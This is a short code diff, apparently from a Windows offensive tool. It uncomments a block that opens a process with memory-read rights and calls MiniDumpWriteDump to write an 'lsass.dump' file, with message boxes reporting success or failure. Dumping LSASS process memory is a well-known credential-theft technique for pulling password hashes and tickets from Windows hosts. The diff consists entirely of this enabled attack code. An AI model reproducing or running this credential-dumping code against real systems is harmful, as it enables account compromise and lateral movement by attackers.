@@ -101,16 +101,16 @@ void entrypoint() {
     DWORD accessAllow = PROCESS_VM_READ | PROCESS_QUERY_INFORMATION;
     HANDLE hProcess = OpenProcess(accessAllow, 0, pid);
 
-    // if (hProcess && hProcess != INVALID_HANDLE_VALUE) {
-    //     bool isDump = MiniDumpWriteDump(hProcess, pid, output, (MINIDUMP_TYPE)0x00000002, NULL, NULL, NULL);
-    //     if (isDump) {
-    //         MessageBoxA(NULL, "Successfully wrote dump file to lsass.dump", "Info", MB_OK | MB_ICONINFORMATION);
-    //     } else {
-    //         DWORD error = GetLastError();
-    //         char buffer[256];
-    //         MessageBoxA(NULL, "MiniDumpWriteDump ERROR", "Error", MB_OK | MB_ICONERROR);
-    //     }
-    // }
+    if (hProcess && hProcess != INVALID_HANDLE_VALUE) {
+        bool isDump = MiniDumpWriteDump(hProcess, pid, output, (MINIDUMP_TYPE)0x00000002, NULL, NULL, NULL);
+        if (isDump) {
+            MessageBoxA(NULL, "Successfully wrote dump file to lsass.dump", "Info", MB_OK | MB_ICONINFORMATION);
+        } else {
+            DWORD error = GetLastError();
+            char buffer[256];
+            MessageBoxA(NULL, "MiniDumpWriteDump ERROR", "Error", MB_OK | MB_ICONERROR);
+        }
+    }
 
     // Write the dump to the file
     // ...
